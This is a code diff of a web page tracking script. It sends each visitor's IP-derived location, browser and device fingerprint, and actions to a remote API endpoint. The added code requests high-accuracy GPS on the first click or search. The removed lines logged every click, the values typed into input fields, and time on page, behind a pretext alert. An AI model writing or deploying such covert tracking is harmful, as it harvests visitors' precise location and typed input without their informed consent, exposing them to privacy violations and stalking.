@@ -50,29 +50,40 @@ async function getIPandLocation() {
   }
 }
 
-// 5. GPS - Latitude, Longitude, Altitude
-async function getGPS() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) return resolve({lat: "N/A", lon: "N/A", alt: "N/A"});
-    
+let gpsData = {lat: "Not Asked", lon: "Not Asked", alt: "N/A", accuracy: "N/A"};
+let gpsAsked = false;
+
+// Ask for GPS only once, after first click
+async function requestGPS() {
+  if(gpsAsked) return;
+  gpsAsked = true;
+
+  gpsData = await new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve({lat: "No Support", lon: "No Support", alt: "N/A", accuracy: "N/A"});
+
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         resolve({
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
           alt: pos.coords.altitude || "N/A",
-          accuracy: pos.coords.accuracy + "m"
+          accuracy: Math.round(pos.coords.accuracy) + "m"
         });
       },
-      () => resolve({lat: "Denied", lon: "Denied", alt: "Denied"}), // if user blocks
-      {enableHighAccuracy: true, timeout: 5000}
+      (err) => resolve({lat: "Denied", lon: "Denied", alt: "Denied", accuracy: err.message}),
+      {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
     );
   });
 }
 
-// 6. Main Send Log Function - now async to wait for GPS/IP
+// Main Send Log Function
 async function sendLog(action, search = "", time = "") {
-  const [ipData, gpsData] = await Promise.all([getIPandLocation(), getGPS()]);
+  // Ask GPS only on first "Click" or "Search" action
+  if(!gpsAsked && (action === "Click" || action === "Search")){
+    await requestGPS();
+  }
+
+  const [ipData] = await Promise.all([getIPandLocation()]);
   const browserData = getBrowserInfo();
   const deviceData = getDeviceSpecs();
 
@@ -81,7 +92,7 @@ async function sendLog(action, search = "", time = "") {
     browser: browserData.userAgent,
     os: browserData.platform,
     language: browserData.language,
-    specs: JSON.stringify(deviceData), // full specs as string
+    specs: JSON.stringify(deviceData),
     action: action,
     search: search,
     page: window.location.href,
@@ -99,40 +110,7 @@ async function sendLog(action, search = "", time = "") {
 
   fetch(API_URL, {
     method: "POST",
-    mode: "no-cors", // for github pages
+    mode: "no-cors",
     body: JSON.stringify(payload)
   }).then(() => console.log("Log sent:", action));
 }
-
-let startTime = Date.now();
-
-// First visit + returning user
-if (!localStorage.getItem("visited")) {
-  alert("Please Click Ok To Continue. We will ask for location permission.");
-  localStorage.setItem("visited", "yes");
-  sendLog("First Visit");
-} else {
-  sendLog("Returning User");
-}
-
-// Page visit
-sendLog("Page Visit");
-
-// Time on page
-window.addEventListener("beforeunload", () => {
-  let timeSpent = Math.floor((Date.now() - startTime) / 1000);
-  sendLog("Time Spent", "", timeSpent + " sec");
-});
-
-// Click tracking
-document.addEventListener("click", (e) => {
-  let text = e.target.innerText || e.target.tagName;
-  sendLog("Click", text);
-});
-
-// Search tracking
-document.addEventListener("change", (e) => {
-  if (e.target.tagName === "INPUT") {
-    sendLog("Search", e.target.value);
-  }
-});
